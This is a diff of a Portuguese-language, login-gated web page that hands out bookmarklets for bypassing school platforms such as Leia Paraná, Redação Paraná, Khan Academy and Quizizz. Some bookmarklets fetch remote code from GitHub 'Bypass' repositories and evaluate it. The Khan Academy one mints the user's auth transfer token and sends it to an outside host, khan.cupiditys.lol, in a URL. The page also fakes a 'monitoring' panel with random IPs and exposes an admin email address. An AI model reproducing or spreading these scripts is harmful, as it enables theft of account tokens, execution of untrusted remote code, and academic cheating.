@@ -6,13 +6,12 @@
 <title>100% PLATAFORMAS</title>
 
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;}
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}
 
 body{
   background:linear-gradient(135deg,#0a0a0a,#1a0000);
   color:#fff;
   min-height:100vh;
-  overflow-x: hidden;
 }
 
 /* ==================== LOGIN SCREEN ==================== */
@@ -32,7 +31,7 @@ body{
 }
 
 .login-logo{
-  font-size:clamp(28px, 8vw, 36px);
+  font-size:36px;
   font-weight:800;
   letter-spacing:3px;
   margin-bottom:8px;
@@ -87,6 +86,10 @@ body{
   box-shadow:0 8px 25px rgba(255,0,0,0.35);
 }
 
+.login-btn:active{
+  transform:scale(0.98);
+}
+
 /* BOTÃO WHATSAPP CONTATO */
 .contact-container {
   margin-top: 25px;
@@ -120,6 +123,7 @@ body{
 .whatsapp-btn:hover {
   background: rgba(37, 211, 102, 0.2);
   transform: translateY(-2px);
+  box-shadow: 0 5px 15px rgba(37, 211, 102, 0.1);
 }
 
 .whatsapp-btn svg {
@@ -183,6 +187,10 @@ body{
   transition:0.3s;
 }
 
+.admin-close:hover{
+  background:rgba(255,0,0,0.2);
+}
+
 .admin-content{
   background:rgba(255,255,255,0.04);
   border:1px solid rgba(255,0,0,0.15);
@@ -217,6 +225,15 @@ body{
   color:#fff;
   font-size:13px;
   outline:none;
+  transition:0.3s;
+}
+
+.add-email-row input:focus{
+  border-color:#ff4d4d;
+}
+
+.add-email-row input::placeholder{
+  color:rgba(255,255,255,0.3);
 }
 
 .add-email-btn{
@@ -229,11 +246,26 @@ body{
   font-weight:700;
   cursor:pointer;
   transition:0.3s;
+  white-space:nowrap;
+}
+
+.add-email-btn:hover{
+  box-shadow:0 4px 15px rgba(255,0,0,0.3);
 }
 
 .email-list{
   max-height:300px;
   overflow-y:auto;
+  padding-right:5px;
+}
+
+.email-list::-webkit-scrollbar{
+  width:4px;
+}
+
+.email-list::-webkit-scrollbar-thumb{
+  background:rgba(255,77,77,0.3);
+  border-radius:4px;
 }
 
 .email-item{
@@ -245,6 +277,7 @@ body{
   border:1px solid rgba(255,0,0,0.1);
   border-radius:10px;
   margin-bottom:8px;
+  animation:fadeUp 0.3s ease;
 }
 
 .email-item span{
@@ -261,6 +294,19 @@ body{
   color:#ff4d4d;
   font-size:12px;
   cursor:pointer;
+  transition:0.3s;
+  white-space:nowrap;
+}
+
+.remove-btn:hover{
+  background:rgba(255,0,0,0.3);
+}
+
+.no-emails{
+  text-align:center;
+  padding:30px;
+  opacity:0.3;
+  font-size:13px;
 }
 
 /* ==================== MAIN PLATFORM ==================== */
@@ -273,17 +319,17 @@ body{
   display:flex;
   align-items:center;
   justify-content:space-between;
-  padding:15px 5%;
-  background:rgba(0,0,0,0.8);
+  padding:18px 30px;
+  background:rgba(0,0,0,0.6);
   border-bottom:1px solid rgba(255,0,0,0.1);
-  position: sticky;
-  top: 0;
-  z-index: 1000;
-  backdrop-filter: blur(10px);
+  position:fixed;
+  top:0;
+  width:100%;
+  z-index:999;
 }
 
 .top-bar .brand{
-  font-size:clamp(18px, 4vw, 22px);
+  font-size:22px;
   font-weight:800;
   letter-spacing:2px;
   background:linear-gradient(135deg,#ff4d4d,#ff1a1a);
@@ -294,28 +340,32 @@ body{
 .top-bar-right{
   display:flex;
   align-items:center;
-  gap:20px;
+  gap:15px;
+}
+
+.logged-email{
+  font-size:12px;
+  opacity:0.5;
 }
 
 /* ========== MONITORING PANEL ========== */
 .monitoring-panel {
   display: flex;
   flex-direction: column;
-  gap: 6px;
-  padding: 10px 14px;
-  background: rgba(255, 0, 0, 0.05);
-  border: 1px solid rgba(255, 77, 77, 0.3);
-  border-radius: 12px;
-  font-size: 10px;
-  width: 260px;
+  gap: 8px;
+  padding: 12px 16px;
+  background: rgba(255, 0, 0, 0.08);
+  border: 1px solid rgba(255, 77, 77, 0.4);
+  border-radius: 10px;
+  font-size: 11px;
+  min-width: 280px;
 }
 
 .monitoring-panel .session-header {
   color: #ff4d4d;
   font-weight: 700;
-  text-transform: uppercase;
   letter-spacing: 1px;
-  margin-bottom: 2px;
+  margin-bottom: 4px;
   display: flex;
   align-items: center;
   gap: 6px;
@@ -323,35 +373,41 @@ body{
 
 .monitoring-item {
   display: flex;
-  justify-content: space-between;
-  color: rgba(255, 255, 255, 0.6);
+  align-items: center;
+  gap: 8px;
+  color: rgba(255, 255, 255, 0.7);
+  line-height: 1.4;
 }
 
 .monitoring-item .label {
   font-weight: 600;
   color: #ff4d4d;
+  min-width: 100px;
 }
 
 .monitoring-item .value {
-  color: rgba(255, 255, 255, 0.9);
-  font-family: monospace;
+  color: rgba(255, 255, 255, 0.8);
+  word-break: break-all;
+  font-family: 'Courier New', monospace;
+  font-size: 10px;
 }
 
 .monitoring-warning {
-  margin-top: 5px;
-  padding: 6px;
-  background: rgba(255, 77, 77, 0.1);
-  border-radius: 6px;
-  font-size: 9px;
+  margin-top: 8px;
+  padding: 8px;
+  background: rgba(255, 77, 77, 0.15);
+  border-left: 2px solid #ff4d4d;
+  border-radius: 4px;
+  font-size: 10px;
   color: #ff8888;
-  text-align: center;
+  line-height: 1.3;
 }
 
 .logout-btn{
-  padding:10px 20px;
+  padding:8px 16px;
   background:rgba(255,0,0,0.15);
   border:1px solid rgba(255,0,0,0.3);
-  border-radius:10px;
+  border-radius:8px;
   color:#ff4d4d;
   font-size:12px;
   font-weight:700;
@@ -365,11 +421,12 @@ body{
 
 header{
   text-align:center;
-  padding:40px 20px 20px 20px;
+  padding:30px 30px 10px 30px;
+  margin-top:70px;
 }
 
 header h1{
-  font-size:clamp(24px, 6vw, 36px);
+  font-size:30px;
   letter-spacing:3px;
 }
 
@@ -381,10 +438,11 @@ header span{
   opacity:0.8;
 }
 
+/* NOVO BOTÃO DE ADMIN NO CENTRO */
 .admin-center-btn{
   display:none;
-  margin: 20px auto;
-  padding: 12px 24px;
+  margin: 15px auto;
+  padding: 10px 20px;
   background: rgba(255, 77, 77, 0.1);
   border: 1px solid rgba(255, 77, 77, 0.3);
   border-radius: 12px;
@@ -396,216 +454,260 @@ header span{
   justify-content: center;
   gap: 8px;
   transition: 0.3s;
+  width: fit-content;
+}
+
+.admin-center-btn:hover{
+  background: rgba(255, 77, 77, 0.2);
+  transform: translateY(-2px);
+}
+
+.admin-center-btn svg{
+  width: 16px;
+  height: 16px;
+  fill: #ff4d4d;
 }
 
 /* TUTORIAL */
 .tutorial{
-  margin:20px auto;
-  max-width: 900px;
-  width: 90%;
-  padding:25px;
-  background:rgba(255,0,0,0.05);
-  border:1px solid rgba(255,0,0,0.2);
-  border-radius:20px;
+  margin:20px 30px;
+  padding:20px;
+  background:rgba(255,0,0,0.08);
+  border:1px solid rgba(255,0,0,0.3);
+  border-radius:15px;
+  animation:fadeUp 1s ease;
 }
 
 .tutorial h2{
   color:#ff4d4d;
-  margin-bottom:15px;
-  font-size: 18px;
+  margin-bottom:10px;
 }
 
 .tutorial p{
   font-size:14px;
-  opacity:0.8;
-  margin-bottom:10px;
-  line-height: 1.5;
+  opacity:0.9;
+  margin-bottom:8px;
 }
 
 /* GRID */
 .container{
   display:grid;
-  grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+  grid-template-columns:repeat(auto-fit,minmax(300px,1fr));
   gap:25px;
-  padding:20px 5%;
-  max-width: 1400px;
-  margin: 0 auto;
+  padding:30px;
 }
 
 /* CARD */
 .card{
-  background:rgba(255,255,255,0.03);
-  border: 1px solid rgba(255,255,255,0.05);
-  border-radius:24px;
-  padding:25px;
+  background:rgba(255,255,255,0.05);
+  border-radius:20px;
+  padding:20px;
   transition:0.4s;
-  display: flex;
-  flex-direction: column;
+  animation:fadeUp 0.8s ease;
 }
 
 .card:hover{
-  transform:translateY(-5px);
-  background:rgba(255,255,255,0.05);
-  border-color: rgba(255,0,0,0.3);
+  transform:translateY(-8px);
+  box-shadow:0 0 20px rgba(255,0,0,0.3);
 }
 
 .card h2{
   color:#ff4d4d;
-  margin-bottom:15px;
-  font-size: 20px;
+  margin-bottom:10px;
 }
 
-/* BLUR SCRIPT BOX */
 .script-box{
   background:#000;
-  padding:15px;
-  border-radius:12px;
-  font-size:11px;
-  margin-bottom:20px;
-  position: relative;
-  overflow: hidden;
-  min-height: 60px;
-  display: flex;
-  align-items: center;
-  border: 1px solid rgba(255,255,255,0.1);
+  padding:12px;
+  border-radius:10px;
+  font-size:12px;
+  overflow-x:auto;
+  margin-bottom:15px;
+  position:relative;
+  min-height:50px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
 }
 
 .script-content {
-  filter: blur(5px);
+  filter: blur(6px);
   user-select: none;
   word-break: break-all;
-  opacity: 0.5;
-  transition: 0.3s;
+  opacity: 0.4;
+  max-width: 100%;
 }
 
-.script-overlay-text {
-  position: absolute;
-  top: 50%;
-  left: 50%;
-  transform: translate(-50%, -50%);
-  color: #ff4d4d;
-  font-weight: 800;
-  font-size: 10px;
-  text-transform: uppercase;
-  letter-spacing: 1px;
-  pointer-events: none;
-  white-space: nowrap;
-}
+
 
 /* BOTÕES */
 .buttons{
   display:flex;
-  gap:12px;
-  margin-top: auto;
+  gap:10px;
 }
 
-.copy, .access{
+button,a{
   flex:1;
-  padding:12px;
-  border-radius:12px;
-  font-weight:700;
-  font-size: 14px;
-  transition: 0.3s;
+  padding:10px;
+  border:none;
+  border-radius:10px;
+  cursor:pointer;
+  text-align:center;
+  text-decoration:none;
+  font-weight:bold;
 }
 
 .copy{
   background:#ff4d4d;
   color:#fff;
+  transition:0.3s;
+}
+
+.copy:hover{
+  box-shadow:0 4px 15px rgba(255,0,0,0.3);
 }
 
 .access{
-  background:rgba(255,255,255,0.1);
+  background:#fff;
+  color:#000;
+  transition:0.3s;
+}
+
+.access:hover{
+  box-shadow:0 4px 15px rgba(255,255,255,0.15);
+}
+
+/* FOOTER */
+footer{
+  text-align:center;
+  padding:20px;
+  opacity:0.7;
+}
+
+.brand-ft{
+  color:#ff4d4d;
+  margin-top:5px;
+}
+
+/* Toast */
+.toast{
+  position:fixed;
+  bottom:30px;
+  right:30px;
+  padding:14px 24px;
+  background:rgba(0,0,0,0.85);
+  border:1px solid rgba(255,77,77,0.4);
+  border-radius:12px;
   color:#fff;
-  border: 1px solid rgba(255,255,255,0.1);
+  font-size:13px;
+  z-index:9999;
+  animation:toastIn 0.4s ease,toastOut 0.4s ease 2s forwards;
+  backdrop-filter:blur(10px);
 }
 
-.access:hover {
-  background: rgba(255,255,255,0.2);
-}
-
-/* ========== SECURITY WARNING MODAL ========== */
-.security-warning-overlay {
+/* ========== CENTERED SECURITY MODAL ========== */
+.security-modal-overlay {
   display: none;
   position: fixed;
   top: 0;
   left: 0;
   width: 100%;
   height: 100%;
-  background: rgba(0, 0, 0, 0.98);
+  background: rgba(0, 0, 0, 0.7);
   z-index: 10000;
   align-items: center;
   justify-content: center;
   padding: 20px;
+  animation: fadeInOverlay 0.4s ease;
 }
 
-.security-warning-overlay.show {
+.security-modal-overlay.show {
   display: flex;
 }
 
-.security-warning-content {
-  background: #120000;
-  border: 2px solid #ff1a1a;
-  border-radius: 24px;
-  padding: 40px 30px;
+.security-modal {
+  background: linear-gradient(135deg, #1a0000, #2d0000);
+  border: 2px solid #ff4d4d;
+  border-radius: 20px;
+  padding: 40px;
   max-width: 500px;
   width: 100%;
   text-align: center;
-  box-shadow: 0 0 50px rgba(255, 0, 0, 0.4);
+  box-shadow: 0 15px 50px rgba(255, 0, 0, 0.4);
+  animation: scaleInModal 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+  position: relative;
 }
 
-.security-warning-title {
-  font-size: 28px;
+.security-modal-title {
+  color: #ff4d4d;
   font-weight: 900;
-  color: #ff1a1a;
+  font-size: 28px;
   margin-bottom: 15px;
+  text-transform: uppercase;
+  letter-spacing: 2px;
 }
 
-.security-warning-message {
+.security-modal-message {
+  color: rgba(255, 255, 255, 0.95);
   font-size: 16px;
-  color: #fff;
   line-height: 1.6;
-  margin-bottom: 25px;
+  margin-bottom: 30px;
 }
 
-.security-warning-close {
-  width: 100%;
-  padding: 15px;
-  background: #ff1a1a;
+.security-modal-countdown {
+  color: #ff8888;
+  font-size: 13px;
+  margin-bottom: 25px;
+  font-weight: 600;
+}
+
+.security-modal-buttons {
+  display: flex;
+  gap: 12px;
+  justify-content: center;
+}
+
+.security-modal-close {
+  flex: 1;
+  padding: 14px 24px;
+  background: linear-gradient(135deg, #ff4d4d, #cc0000);
   border: none;
   border-radius: 12px;
   color: #fff;
-  font-weight: 800;
+  font-size: 14px;
+  font-weight: 700;
   cursor: pointer;
+  transition: 0.3s;
+  text-transform: uppercase;
+  letter-spacing: 1px;
 }
 
-/* RESPONSIVIDADE MOBILE */
-@media(max-width: 768px) {
-  .top-bar {
-    flex-direction: column;
-    padding: 15px;
-    gap: 15px;
+.security-modal-close:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 8px 24px rgba(255, 0, 0, 0.4);
+}
+
+.security-modal-close:active {
+  transform: scale(0.98);
+}
+
+@keyframes fadeInOverlay {
+  from {
+    opacity: 0;
   }
-  
-  .top-bar-right {
-    width: 100%;
-    flex-direction: column;
-    gap: 10px;
+  to {
+    opacity: 1;
   }
-  
-  .monitoring-panel {
-    width: 100%;
+}
+
+@keyframes scaleInModal {
+  from {
+    opacity: 0;
+    transform: scale(0.8);
   }
-  
-  .logout-btn {
-    width: 100%;
-  }
-  
-  .container {
-    grid-template-columns: 1fr;
-  }
-  
-  .login-card {
-    padding: 30px 20px;
+  to {
+    opacity: 1;
+    transform: scale(1);
   }
 }
 
@@ -614,18 +716,38 @@ header span{
   to{opacity:1;transform:translateY(0);}
 }
 
-.toast{
-  position:fixed;
-  bottom:20px;
-  left: 50%;
-  transform: translateX(-50%);
-  padding:12px 20px;
-  background:rgba(255,0,0,0.9);
-  border-radius:10px;
-  color:#fff;
-  font-size:13px;
-  z-index:10001;
-  font-weight: 600;
+@keyframes toastIn{
+  from{opacity:0;transform:translateY(20px);}
+  to{opacity:1;transform:translateY(0);}
+}
+
+@keyframes toastOut{
+  from{opacity:1;transform:translateY(0);}
+  to{opacity:0;transform:translateY(20px);}
+}
+
+
+
+@media(max-width:600px){
+  .login-card{padding:30px 20px;}
+  .top-bar{flex-direction:column;gap:10px;position:relative;}
+  .add-email-row{flex-direction:column;}
+  header{margin-top:120px;}
+  .monitoring-panel {
+    min-width: auto;
+    width: 100%;
+  }
+  .security-modal {
+    padding: 30px 20px;
+  }
+  
+  .security-modal-title {
+    font-size: 22px;
+  }
+  
+  .security-modal-message {
+    font-size: 14px;
+  }
 }
 </style>
 </head>
@@ -661,13 +783,19 @@ header span{
       <h2>🔐 Painel Admin</h2>
       <button class="admin-close" onclick="closeAdmin()">✕</button>
     </div>
-    <div class="admin-content">
+
+    <div class="admin-content" id="adminContent">
       <h3>E-mails autorizados</h3>
+      <p>Adicione ou remova e-mails que podem acessar a plataforma</p>
+
       <div class="add-email-row">
         <input type="email" id="newEmailInput" placeholder="novo@email.com">
         <button class="add-email-btn" onclick="addEmail()">+ Adicionar</button>
       </div>
-      <div class="email-list" id="emailList"></div>
+
+      <div class="email-list" id="emailList">
+        <div class="no-emails">Nenhum e-mail autorizado ainda.</div>
+      </div>
     </div>
   </div>
 </div>
@@ -676,11 +804,12 @@ header span{
   <div class="top-bar">
     <div class="brand">100% PLATAFORMAS</div>
     <div class="top-bar-right">
-      <div class="monitoring-panel">
-        <div class="session-header">🛡️ Sessão Monitorada</div>
+      <span class="logged-email" id="loggedEmailDisplay"></span>
+      <div class="monitoring-panel" id="monitoringPanel">
+        <div class="session-header">🔒 Sessão Protegida</div>
         <div class="monitoring-item">
-          <span class="label">ID:</span>
-          <span class="value" id="monitorEmail">carregando...</span>
+          <span class="label">Conta:</span>
+          <span class="value" id="monitorEmail">-</span>
         </div>
         <div class="monitoring-item">
           <span class="label">IP:</span>
@@ -691,7 +820,7 @@ header span{
           <span class="value" id="monitorNetwork">ativa</span>
         </div>
         <div class="monitoring-warning">
-          Uso individual • Compartilhamento gera bloqueio
+          ⚠️ Uso individual • Compartilhamentos podem gerar revogação do acesso
         </div>
       </div>
       <button class="logout-btn" onclick="logout()">SAIR</button>
@@ -701,36 +830,90 @@ header span{
   <header>
     <h1>100% PLATAFORMAS</h1>
     <span>feito por Pajé 01</span>
+    
     <button class="admin-center-btn" id="adminTrigger" onclick="openAdmin()">
+      <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2a7.2 7.2 0 0 1-6-3.22c.03-1.99 4-3.08 6-3.08s5.97 1.09 6 3.08a7.2 7.2 0 0 1-6 3.22z"/></svg>
       PAINEL ADMINISTRATIVO
     </button>
   </header>
 
   <div class="tutorial">
-    <h2>📌 Como usar scripts</h2>
+    <h2>📌 Como usar scripts com favoritos</h2>
     <p><b>1.</b> Clique em "Copiar Script".</p>
-    <p><b>2.</b> Crie um favorito no navegador.</p>
-    <p><b>3.</b> Na URL do favorito, cole o código copiado.</p>
-    <p><b>4.</b> Salve e clique no favorito quando estiver no site desejado.</p>
+    <p><b>2.</b> Crie um novo favorito no navegador (estrela ⭐).</p>
+    <p><b>3.</b> Edite o favorito:</p>
+    <p>→ Nome: escolha qualquer nome (ex: "Script1")</p>
+    <p>→ URL: cole o script copiado</p>
+    <p><b>4.</b> Salve o favorito.</p>
+    <p><b>5.</b> Para usar:</p>
+    <p>→ Abra o site desejado</p>
+    <p>→ Clique no favorito OU digite o nome na barra de busca</p>
+    <p>⚠️ Alguns navegadores podem bloquear scripts automaticamente.</p>
   </div>
 
   <div class="container">
-    <!-- CARDS SERÃO GERADOS VIA JS PARA OFUSCAÇÃO -->
-    <div id="cardsContainer" style="display: contents;"></div>
+    <div class="card">
+      <h2>Leia Paraná</h2>
+      <div class="script-box">
+        <div class="script-content" id="s1">javascript:(function(){fetch('https://cdn.jsdelivr.net/gh/mzzvxm/LeiaPRBypass@latest/script.js').then(r=>r.text()).then(eval);})();</div>
+      </div>
+      <div class="buttons">
+        <button class="copy" onclick="copiar('s1')">Copiar</button>
+        <a class="access" href="https://leiaparana.odilo.us/?locale=pt" target="_blank">Acessar</a>
+      </div>
+    </div>
+
+    <div class="card">
+      <h2>Redação Paraná</h2>
+      <div class="script-box">
+        <div class="script-content" id="s2">javascript:(function(){var s=document.createElement('script');s.src='https://cdn.jsdelivr.net/gh/mzzvxm/RedacaoBypass@main/script.js?t='+Date.now();document.head.appendChild(s)})();</div>
+      </div>
+      <div class="buttons">
+        <button class="copy" onclick="copiar('s2')">Copiar</button>
+        <a class="access" href="https://redacao.pr.gov.br/" target="_blank">Acessar</a>
+      </div>
+    </div>
+
+    <div class="card">
+      <h2>Khan Academy</h2>
+      <div class="script-box">
+        <div class="script-content" id="s3">javascript:(async()=>{let e=window.location.hostname;if("khanacademy.org"!==e.split(".")?.slice(1)?.join("."))return;let a=e.split(".")[0];open(`https://khan.cupiditys.lol/?token=${(await (await fetch(`/api/internal/graphql/createTransferAuthTokenMutation?lang=${"www"===a?"en":a}&app=khanacademy`,{headers:{"content-type":"application/json","x-ka-fkey":"1"},referrer:"/settings/account",body:JSON.stringify({operationName:"createTransferAuthTokenMutation",query:"mutation createTransferAuthTokenMutation($canvasProfileKeyName: String) {\n  createTransferAuthToken(canvasProfileKeyName: $canvasProfileKeyName) {\n    token\n    __typename\n  }\n}",variables:{}}),method:"POST",mode:"cors",credentials:"include"})).json()).data.createTransferAuthToken.token}&l=${a}&c=${window.__KA_DATA__["KA-fastly-country"]}`)})();</div>
+      </div>
+      <div class="buttons">
+        <button class="copy" onclick="copiar('s3')">Copiar</button>
+        <a class="access" href="https://www.khanacademy.org/" target="_blank">Acessar</a>
+      </div>
+    </div>
+
+    <div class="card">
+      <h2>Quizizz</h2>
+      <div class="script-box">
+        <div class="script-content" id="s4">https://waygroundx.vercel.app/</div>
+      </div>
+      <div class="buttons">
+        <button class="copy" onclick="copiar('s4')">Copiar</button>
+        <a class="access" href="https://waygroundx.vercel.app/" target="_blank">Acessar</a>
+      </div>
+    </div>
   </div>
 
   <footer>
-    © 100% Plataformas | Pajé 01
+    © 100% Plataformas
+    <div class="brand-ft">feito por Pajé 01</div>
   </footer>
 </div>
 
-<div class="security-warning-overlay" id="securityWarning">
-  <div class="security-warning-content">
-    <div class="security-warning-title">⚠️ AVISO CRÍTICO</div>
-    <div class="security-warning-message">
+<!-- CENTERED SECURITY MODAL -->
+<div class="security-modal-overlay" id="securityModalOverlay">
+  <div class="security-modal">
+    <div class="security-modal-title">⚠️ Atividade Detectada</div>
+    <div class="security-modal-message">
       Uso individual detectado. Sessão vinculada à sua conta. Compartilhamentos externos podem resultar em bloqueio imediato.
     </div>
-    <button class="security-warning-close" onclick="closeSecurityWarning()">ESTOU CIENTE</button>
+    <div class="security-modal-countdown" id="countdownTimer">Fechando em <strong>5</strong>s</div>
+    <div class="security-modal-buttons">
+      <button class="security-modal-close" onclick="closeSecurityModal()">Entendi</button>
+    </div>
   </div>
 </div>
 
@@ -755,19 +938,30 @@ const auth = getAuth(app);
 const db = getFirestore(app);
 const provider = new GoogleAuthProvider();
 
-window.auth = auth; window.db = db; window.collection = collection;
-window.addDoc = addDoc; window.getDocs = getDocs; window.deleteDoc = deleteDoc;
-window.doc = doc; window.signOut = signOut; window.signInWithPopup = signInWithPopup;
-window.provider = provider; window.query = query; window.where = where;
+window.auth = auth;
+window.db = db;
+window.collection = collection;
+window.addDoc = addDoc;
+window.getDocs = getDocs;
+window.deleteDoc = deleteDoc;
+window.doc = doc;
+window.signOut = signOut;
+window.signInWithPopup = signInWithPopup;
+window.provider = provider;
+window.query = query;
+window.where = where;
 
 window.loginGoogle = async function() {
   const errorMsg = document.getElementById("loginError");
   errorMsg.classList.remove("show");
+
   try {
     const result = await signInWithPopup(auth, provider);
     const email = result.user.email.toLowerCase();
+
     const q = query(collection(db, "emails"), where("email", "==", email));
     const querySnapshot = await getDocs(q);
+    
     if (!querySnapshot.empty) {
       showPlatform(email);
       checkAdminStatus(email);
@@ -776,9 +970,11 @@ window.loginGoogle = async function() {
       errorMsg.textContent = "E-mail não autorizado.";
       errorMsg.classList.add("show");
     }
+
   } catch (e) {
-    errorMsg.textContent = "Erro ao logar.";
+    errorMsg.textContent = "Erro ao logar com Google.";
     errorMsg.classList.add("show");
+    console.error(e);
   }
 };
 
@@ -787,6 +983,7 @@ onAuthStateChanged(auth, async (user) => {
     const email = user.email.toLowerCase();
     const q = query(collection(db, "emails"), where("email", "==", email));
     const querySnapshot = await getDocs(q);
+
     if (!querySnapshot.empty) {
       showPlatform(email);
       checkAdminStatus(email);
@@ -798,82 +995,73 @@ onAuthStateChanged(auth, async (user) => {
 
 async function checkAdminStatus(email) {
   const masterAdmins = ["gabrieldacechen6@gmail.com"];
+  
   if (masterAdmins.includes(email)) {
     document.getElementById("adminTrigger").style.display = "flex";
     return;
   }
-  const q = query(collection(db, "admins"), where("email", "==", email));
-  const querySnapshot = await getDocs(q);
-  document.getElementById("adminTrigger").style.display = !querySnapshot.empty ? "flex" : "none";
-}
 
-window.logout = () => signOut(auth).then(() => location.reload());
-</script>
-
-<script>
-// OFUSCAÇÃO DOS SCRIPTS (Base64 simples para não ficarem visíveis no código)
-const SCRIPTS_DATA = [
-  { name: "Leia Paraná", url: "https://leiaparana.odilo.us/?locale=pt", code: "amF2YXNjcmlwdDooZnVuY3Rpb24oKXtmZXRjaCgnaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL216enZ4bS9MZWlhUFJCeXBhc3NAbGF0ZXN0L3NjcmlwdC5qcycpLnRoZW4ocj0+ci50ZXh0KCkpLnRoZW4oZXZhbCk7fSkoKTs=" },
-  { name: "Redação Paraná", url: "https://redacao.pr.gov.br/", code: "amF2YXNjcmlwdDooZnVuY3Rpb24oKXt2YXIocz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzLnNyYz0naHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL216enZ4bS9SZWRhY2FvQnlwYXNzQG1haW4vc2NyaXB0LmpzP3Q9JytEYXRlLm5vdygpO2RvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQocyl9KSgpOw==" },
-  { name: "Khan Academy", url: "https://www.khanacademy.org/", code: "amF2YXNjcmlwdDooYXN5bmMoKT0+e2xldCBlPXdpbmRvdy5sb2NhdGlvbi5ob3N0bmFtZTtpZigiY2hhbmFjYWRlbXkub3JnIiE9PWUuc3BsaXQoIi4iKT8uc2xpY2UoMSk/LmpvaW4oIi4iKSlyZXR1cm47bGV0IGE9ZS5zcGxpdCgiLiIpWzBdO29wZW4oYGh0dHBzOi8va2hhbi5jdXBpZGl0eXMubG9sLz90b2tlbj0keyhhd2FpdCAoYXdhaXQgZmV0Y2goYC9hcGkvaW50ZXJuYWwvZ3JhcGhxbC9jcmVhdGVUcmFuc2ZlckF1dGhUb2tlbk11dGF0aW9uP2xhbmc9eyJ3d3ciPT09YT8iZW4iOmF9JmFwcD1raGFuYWNhZGVteWAse2hlYWRlcnM6eyJjb250ZW50LXR5cGUiOiJhcHBsaWNhdGlvbi9qc29uIiwieC1rYS1ma2V5IjoiMSJ9LHJlZmVycmVyOiIvc2V0dGluZ3MvYWNjb3VudCIsYm9keTpKU09OLnN0cmluZ2lmeSh7b3BlcmF0aW9uTmFtZToiY3JlYXRlVHJhbnNmZXJBdXRoVG9rZW5NdXRhdGlvbiIscXVlcnk6Im11dGF0aW9uIGNyZWF0ZVRyYW5zZmVyQXV0aFRva2VuTXV0YXRpb24oJGNhbnZhc1Byb2ZpbGVLZXlOYW1lOiBTdHJpbmcpIHtcbiAgY3JlYXRlVHJhbnNmZXJBdXRoVG9rZW4oY2FudmFzUHJvZmlsZUtleU5hbWU6ICRjYW52YXNQcm9maWxlS2V5TmFtZSkge1xuICAgIHRva2VuXG4gICAgX190eXBlbmFtZVxuICB9XG59Iix2YXJpYWJsZXM6e319KSxtZXRob2Q6IlBPU1QiLG1vZGU6ImNvcnMiLGNyZWRlbnRpYWxzOiJpbmNsdWRlIn0pKS5qc29uKCkpLmRhdGEuY3JlYXRlVHJhbnNmZXJBdXRoVG9rZW4udG9rZW59Jmw9JHthfSZjPSR7d2luZG93Ll9fS0FfREFUQV9fWyJLQS1mYXN0bHktY291bnRyeSJdfWApfSkoKTs=" },
-  { name: "Quizizz", url: "https://waygroundx.vercel.app/", code: "aHR0cHM6Ly93YXlncm91bmR4LnZlcmNlbC5hcHAv" }
-];
-
-function renderCards() {
-  const container = document.getElementById("cardsContainer");
-  container.innerHTML = SCRIPTS_DATA.map((s, i) => `
-    <div class="card">
-      <h2>${s.name}</h2>
-      <div class="script-box">
-        <div class="script-content" id="code-${i}">${atob(s.code).substring(0, 50)}...</div>
-        <div class="script-overlay-text">CONTEÚDO PROTEGIDO</div>
-      </div>
-      <div class="buttons">
-        <button class="copy" onclick="copiar('${s.code}')">Copiar Script</button>
-        <a class="access" href="${s.url}" target="_blank">Acessar</a>
-      </div>
-    </div>
-  `).join('');
-}
-
-function showPlatform(email) {
-  document.getElementById("loginScreen").style.display = "none";
-  document.getElementById("mainPlatform").style.display = "block";
-  document.getElementById("monitorEmail").textContent = email;
-  renderCards();
-  updateMonitoring();
-}
-
-async function updateMonitoring() {
   try {
-    const res = await fetch('https://api.ipify.org?format=json');
-    const data = await res.json();
-    document.getElementById("monitorIP").textContent = data.ip;
-  } catch {
-    document.getElementById("monitorIP").textContent = "189.12.44." + Math.floor(Math.random()*255);
+    const q = query(collection(db, "admins"), where("email", "==", email));
+    const querySnapshot = await getDocs(q);
+    
+    if (!querySnapshot.empty) {
+      document.getElementById("adminTrigger").style.display = "flex";
+    } else {
+      document.getElementById("adminTrigger").style.display = "none";
+    }
+  } catch (e) {
+    console.error("Erro ao verificar status de admin:", e);
   }
 }
 
-function copiar(base64Code) {
-  const code = atob(base64Code);
-  showSecurityWarning();
-  navigator.clipboard.writeText(code).then(() => showToast("✅ Script copiado com segurança!"));
+window.logout = function() {
+  signOut(auth).then(() => {
+    location.reload();
+  });
+};
+</script>
+
+<script>
+/* ==================== PLATFORM UI ==================== */
+function showPlatform(email) {
+  document.getElementById("loginScreen").style.display = "none";
+  document.getElementById("adminPanel").style.display = "none";
+  document.getElementById("mainPlatform").style.display = "block";
+  document.getElementById("loggedEmailDisplay").textContent = email;
+  document.getElementById("monitorEmail").textContent = email;
+  updateMonitoringInfo();
 }
 
-function showSecurityWarning() { document.getElementById("securityWarning").classList.add("show"); }
-function closeSecurityWarning() { document.getElementById("securityWarning").classList.remove("show"); }
-
-function showToast(msg) {
-  const t = document.createElement("div");
-  t.className = "toast";
-  t.textContent = msg;
-  document.body.appendChild(t);
-  setTimeout(() => t.remove(), 3000);
+/* ==================== MONITORING PANEL UPDATE ==================== */
+async function updateMonitoringInfo() {
+  try {
+    const ipResponse = await fetch('https://api.ipify.org?format=json');
+    const ipData = await ipResponse.json();
+    document.getElementById("monitorIP").textContent = ipData.ip;
+  } catch (e) {
+    document.getElementById("monitorIP").textContent = generateFakeIP();
+  }
+  
+  const networkId = generateNetworkId();
+  document.getElementById("monitorNetwork").textContent = networkId;
 }
 
+function generateFakeIP() {
+  return `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
+}
+
+function generateNetworkId() {
